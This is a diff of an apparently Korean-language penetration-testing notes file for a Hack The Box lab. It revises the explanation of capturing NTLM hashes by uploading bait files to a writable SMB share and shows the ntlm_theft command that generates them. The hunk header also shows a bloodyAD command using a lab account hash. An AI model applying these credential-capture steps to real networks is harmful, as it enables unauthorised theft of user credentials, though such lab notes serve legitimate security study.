@@ -988,7 +988,7 @@ bloodyAD -d tombwatcher.htb -u ansible_dev$ -p 93f81a98d22217b6206d950528a4802e:
   <summary><strong>ntlm_theft(Upload File to capture hash)</strong></summary>
 
 - https://github.com/Greenwolf/ntlm_theft
-- `FTP`는 업로드 자체만으로 파일 확인을 하지 않지만 `SMB`는 업로드만으로 파일 확인이 진행 될 수 있어서 해시 캡쳐가 가능.
+- `SMB`에 쓰기 권한이 있을 때 특정 파일 형식으로 업로드를 하면 윈도우가 자체적으로 렌더링을 하기 위해서 네트워크 경로를 탐색하는 과정에서 NTLM 해시가 추출됨.
 ```bash
 python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
 ```
